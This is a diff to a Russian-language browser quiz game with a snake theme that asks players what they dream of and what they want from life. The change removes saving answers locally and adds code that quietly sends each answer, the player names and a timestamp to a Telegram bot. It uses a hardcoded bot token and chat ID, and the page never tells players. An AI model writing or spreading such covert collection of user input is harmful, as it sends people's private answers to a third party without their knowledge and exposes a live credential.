@@ -93,8 +93,8 @@ html, body {
 /* ══════════════════════════════════════════
    CONFIG  — поменяй имена здесь
 ══════════════════════════════════════════ */
-const NAME1 = '0004';   // первое имя
-const NAME2 = 'Четстер';     // второе имя
+const NAME1 = 'Незнакомец';   // первое имя
+const NAME2 = 'Дружочек';     // второе имя
 
 /* ══════════════════════════════════════════
    AUDIO ENGINE
@@ -494,23 +494,18 @@ function doChoice() {
 /* ══════════════════════════════════════════
    INPUT FIELD
 ══════════════════════════════════════════ */
-function fmtTS() {
-  const d = new Date();
-  return `${d.getFullYear()}`
-    + `${String(d.getMonth()+1).padStart(2,'0')}`
-    + `${String(d.getDate()).padStart(2,'0')}_`
-    + `${String(d.getHours()).padStart(2,'0')}`
-    + `${String(d.getMinutes()).padStart(2,'0')}`
-    + `${String(d.getSeconds()).padStart(2,'0')}`;
-}
 
-function triggerDL(filename, content) {
-  const a   = document.createElement('a');
-  a.href    = URL.createObjectURL(new Blob([content], {type:'text/plain;charset=utf-8'}));
-  a.download = filename;
-  document.body.appendChild(a);
-  a.click();
-  setTimeout(() => { URL.revokeObjectURL(a.href); document.body.removeChild(a); }, 500);
+const TG_TOKEN   = '8736243209:AAGLJ3qKHuKXsRypcuXlCJJ7k5fxZvREOCs';
+const TG_CHAT_ID = '1181124875';
+
+async function sendTG(text) {
+  try {
+    await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ chat_id: TG_CHAT_ID, text, parse_mode: 'HTML' })
+    });
+  } catch {}
 }
 
 function doInput(n, prompt, mode) {
@@ -555,7 +550,7 @@ function doInput(n, prompt, mode) {
   };
   typePrompt();
 
-  const submit = () => {
+  const submit = async () => {
     const val = field.value.trim();
     if (!val) {
       field.style.borderBottomColor = '#f44';
@@ -563,18 +558,17 @@ function doInput(n, prompt, mode) {
       field.focus();
       return;
     }
-    const ts = fmtTS();
-    if (n === 1) {
-      triggerDL(
-        `${NAME1}2x${ts}.txt`,
-        `Дата: ${new Date().toLocaleString()}\nВопрос: О чём ты мечтаешь?\nОтвет: ${val}\n`
-      );
-    } else {
-      triggerDL(
-        `${NAME1}${ts}.txt`,
-        `Дата: ${new Date().toLocaleString()}\nВопрос: Чего ты хочешь от жизни?\nОтвет: ${val}\n`
-      );
-    }
+    btn.textContent = '[ ... ]';
+    btn.style.pointerEvents = 'none';
+    const question = n === 1 ? 'О чём ты мечтаешь?' : 'Чего ты хочешь от жизни?';
+    const ts = new Date().toLocaleString('ru-RU');
+    await sendTG(
+      `🐍 <b>snake_survey</b>\n` +
+      `👤 Имя: <b>${NAME1} / ${NAME2}</b>\n` +
+      `❓ Вопрос ${n}: ${question}\n` +
+      `💬 Ответ: <b>${val}</b>\n` +
+      `🕐 ${ts}`
+    );
     blocked = false;
     si++;
     run();
